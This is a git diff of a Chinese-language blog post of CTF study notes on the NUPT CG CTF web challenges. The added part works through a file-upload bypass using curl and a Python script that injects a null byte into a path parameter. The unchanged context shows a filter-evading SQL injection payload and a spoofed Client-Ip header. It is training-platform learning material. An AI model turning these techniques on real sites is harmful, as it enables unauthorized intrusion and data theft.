@@ -1,7 +1,7 @@
 ---
 layout: post
 title:  "信息安全学习笔记 - 南邮攻防平台 CG CTF Web"
-date:   2020-04-11 15:19:38 +0800
+date:   2020-04-12 23:00:38 +0800
 ---
 # Problems
 
@@ -287,6 +287,95 @@ curl 'http://chinalover.sinaapp.com/web18/' -X POST -d 'pass=kke&thepassword_123
 curl http://chinalover.sinaapp.com/web4/xxx.php -v -H 'Client-Ip: 127.0.0.1'
 ```
 
+## [上传绕过](http://teamxlc.sinaapp.com/web5/21232f297a57a5a743894a0e4a801fc3/index.html)
+
+```shell
+# 随便上传一个文本文件
+echo 25252 > temp.txt
+curl http://teamxlc.sinaapp.com/web5/21232f297a57a5a743894a0e4a801fc3/upload.php -X POST -F "dir=/uploads/" -F "file=@temp.txt"
+# 提示只接收图像格式
+
+# 那就上传一个图片吧
+echo 25252 > temp.png
+curl http://teamxlc.sinaapp.com/web5/21232f297a57a5a743894a0e4a801fc3/upload.php -X POST -F "dir=/uploads/" -F "file=@temp.png"
+# 提示要上传一个php文本
+
+# 那就上传文本吧
+cp temp.png temp.php
+curl http://teamxlc.sinaapp.com/web5/21232f297a57a5a743894a0e4a801fc3/upload.php -X POST -F "dir=/uploads/" -F "file=@temp.php"
+# 又提示只接受图像
+# 看样子这个判断逻辑是基于文件拓展名，不会去看文件的内容
+```
+注意到参数dir的值是否以斜杠结尾会影响文件的名字：
+```shell
+ubuntu@VM-0-5-ubuntu:~/kayoch1n.github.io$ curl http://teamxlc.sinaapp.com/web5/21232f297a57a5a743894a0e4a801fc3/upload.php -X POST -F "dir=/uploads/25252/" -F "file=@temp.png"
+<html><head><meta charset="utf-8" /></head><body>
+Array
+(
+    [0] => .png
+    [1] => png
+)
+Upload: temp.png<br />Type: image/png<br />Size: 0.005859375 Kb<br />Stored in: ./uploads/8a9e5f6a7a789acb.phparray(4) {
+  ["dirname"]=>
+  string(15) "./uploads/25252"
+  ["basename"]=>
+  string(8) "temp.png"
+  ["extension"]=>
+  string(3) "png"
+  ["filename"]=>
+  string(4) "temp"
+}
+<br>必须上传成后缀名为php的文件才行啊！<br></body>
+</html>ubuntu@VM-0-5-ubuntu:~/kayoch1n.github.io$ 
+ubuntu@VM-0-5-ubuntu:~/kayoch1n.github.io$ 
+ubuntu@VM-0-5-ubuntu:~/kayoch1n.github.io$ curl http://teamxlc.sinaapp.com/web5/21232f297a57a5a743894a0e4a801fc3/upload.php -X POST -F "dir=/uploads/25252" -F "file=@temp.png"
+<html><head><meta charset="utf-8" /></head><body>
+Array
+(
+    [0] => .png
+    [1] => png
+)
+Upload: temp.png<br />Type: image/png<br />Size: 0.005859375 Kb<br />Stored in: ./uploads/8a9e5f6a7a789acb.phparray(4) {
+  ["dirname"]=>
+  string(9) "./uploads"
+  ["basename"]=>
+  string(13) "25252temp.png"
+  ["extension"]=>
+  string(3) "png"
+  ["filename"]=>
+  string(9) "25252temp"
+}
+<br>必须上传成后缀名为php的文件才行啊！<br></body>
+</html>ubuntu@VM-0-5-ubuntu:~/kayoch1n.github.io$ 
+```
+
+也许代码通过 basename 判断文件类型，应该在dir参数上面做点文章？谷歌说可以给dir参数加null字节试试（想起前面有个 `ereg` 函数会把null字节当成字符串结束的标志）。
+
+谷歌给出的参考做法是先令dir=`/uploads/xxx.phpa`、用burpsuite把结尾的a改成`\x00`。无奈网络不好，158M的社区版要下9小时'_'|||。另外curl不能在`-F`指定一个null字节，`-F`和`-d`也不能同时使用；比如下面的命令并不能让参数带上null字节：
+```shell
+curl www.qq.com -X POST -F "dir=/uploads/25252.php`echo -ne '\x00'`"
+# bash: warning: command substitution: ignored null byte in input
+# 这是因为bash用C字符串存变量 https://stackoverflow.com/a/42493691/8706476
+```
+
+用python可以传输null字节：
+
+```python
+#!/usr/bin/python3
+# temp.py
+import requests
+
+with open(f'temp.png', mode='rb') as f:
+  url = 'http://teamxlc.sinaapp.com/web5/21232f297a57a5a743894a0e4a801fc3/upload.php'
+  rsp = requests.post(url=url, data=dict(dir='/uploads/25252.php\x00'), files=dict(file=f))
+
+  rsp.encoding = 'utf8'
+  print(rsp.status_code)
+  print(rsp.text)
+```
+
+
+
 ## [SQL注入1](http://chinalover.sinaapp.com/index.php)
 
 不看源代码试不出来
@@ -516,7 +605,7 @@ curl -X POST -H 'User-Agent: Xlcteam Browser' http://cms.nuptzj.cn/so.php -d 'so
 # quote("25252\tun ion\tsel ect\t1,column_type,column_nanameme,4\tfr om\tinfoorrmation_schema.columns\twhere\ttable_schema\tin\t(database())\tlimit\t1\toffset\t2")
 curl -X POST -H 'User-Agent: Xlcteam Browser' http://cms.nuptzj.cn/so.php -d 'soid=25252%09un%20ion%09sel%20ect%091%2Ccolumn_type%2Ccolumn_nanameme%2C4%09fr%20om%09infoorrmation_schema.columns%09where%09table_schema%09in%09%28database%28%29%29%09limit%091%09offset%092'
 
-# 密码 fuckruntu 我怎么感觉像你在骂人
+# 密码 fuckruntu 我怎么感觉你在骂人
 # ''.join(map(lambda x: chr(int(x)), '102 117 99 107 114 117 110 116 117'.split()))
 ```
 
